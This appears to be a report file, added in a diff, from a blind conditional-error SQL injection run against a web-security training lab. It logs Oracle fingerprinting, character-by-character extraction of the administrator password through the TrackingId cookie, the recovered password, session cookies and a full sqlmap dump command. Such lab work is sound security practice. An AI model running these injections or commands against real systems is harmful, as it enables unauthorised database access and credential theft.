@@ -1,0 +1,71 @@
+======================================================================
+  BLIND CONDITIONAL ERROR SQLi — REPORT
+======================================================================
+
+  URL           : https://0a02006304d3117e8591c967007a001d.web-security-academy.net/
+  Cookie Param  : TrackingId
+  DBMS          : Oracle
+  Table         : users
+  Target User   : administrator
+  Password Len  : 20
+  Password      : bsip161d4odzxegv9cio
+  Timestamp     : 2026-03-25 09:10:05
+
+----------------------------------------------------------------------
+  SQLMAP COMMAND
+----------------------------------------------------------------------
+
+  sqlmap -u "https://0a02006304d3117e8591c967007a001d.web-security-academy.net/" --cookie="TrackingId=xyz*L93HwoVUafP1SHx8; session=gYftag124FejPqiNkE8JB4QzEH1P95XI" --dbms=Oracle --technique=E --level=3 --risk=2 --batch --threads=1 -p TrackingId -T users -C username,password --dump --random-agent
+
+----------------------------------------------------------------------
+  LOG
+----------------------------------------------------------------------
+
+[+] BLIND CONDITIONAL ERROR SQLi 
+    Target : https://0a02006304d3117e8591c967007a001d.web-security-academy.net/
+    Cookie : TrackingId
+    Table  : users | User: administrator
+    Started: 2026-03-25 09:09:18
+    
+    [*] STEP 1: Fingerprinting Database Type...
+    [+] Oracle: valid→200 + invalid→500  →  CONFIRMED!
+    [+] Detected DBMS: Oracle
+    
+    [*] STEP 2: Verifying Conditional Error Injection...
+    [+] Conditional errors CONFIRMED: TRUE→500, FALSE→200
+    [*] Checking user 'administrator' in 'users'...
+    [+] User 'administrator' EXISTS in 'users'!
+    
+    [*] STEP 3: Extracting Password...
+    [*] Finding password length (binary search)...
+    [+] Password length: 20 characters
+    [*] Extracting 20 chars (10 threads)...
+    [+] Pos 01: 'b'  →  b???????????????????
+    [+] Pos 08: 'd'  →  b??????d????????????
+    [+] Pos 11: 'd'  →  b??????d??d?????????
+    [+] Pos 03: 'i'  →  b?i????d??d?????????
+    [+] Pos 04: 'p'  →  b?ip???d??d?????????
+    [+] Pos 10: 'o'  →  b?ip???d?od?????????
+    [+] Pos 14: 'e'  →  b?ip???d?od??e??????
+    [+] Pos 15: 'g'  →  b?ip???d?od??eg?????
+    [+] Pos 02: 's'  →  bsip???d?od??eg?????
+    [+] Pos 18: 'c'  →  bsip???d?od??eg??c??
+    [+] Pos 07: '1'  →  bsip??1d?od??eg??c??
+    [+] Pos 12: 'z'  →  bsip??1d?odz?eg??c??
+    [+] Pos 06: '6'  →  bsip?61d?odz?eg??c??
+    [+] Pos 19: 'i'  →  bsip?61d?odz?eg??ci?
+    [+] Pos 05: '1'  →  bsip161d?odz?eg??ci?
+    [+] Pos 09: '4'  →  bsip161d4odz?eg??ci?
+    [+] Pos 13: 'x'  →  bsip161d4odzxeg??ci?
+    [+] Pos 16: 'v'  →  bsip161d4odzxegv?ci?
+    [+] Pos 20: 'o'  →  bsip161d4odzxegv?cio
+    [+] Pos 17: '9'  →  bsip161d4odzxegv9cio
+    
+    [✓] PASSWORD: bsip161d4odzxegv9cio
+    
+    [*] STEP 4: SQLMap Command...
+    [+] Command:
+        sqlmap -u "https://0a02006304d3117e8591c967007a001d.web-security-academy.net/" --cookie="TrackingId=xyz*L93HwoVUafP1SHx8; session=gYftag124FejPqiNkE8JB4QzEH1P95XI" --dbms=Oracle --technique=E --level=3 --risk=2 --batch --threads=1 -p TrackingId -T users -C username,password --dump --random-agent
+    
+
+======================================================================
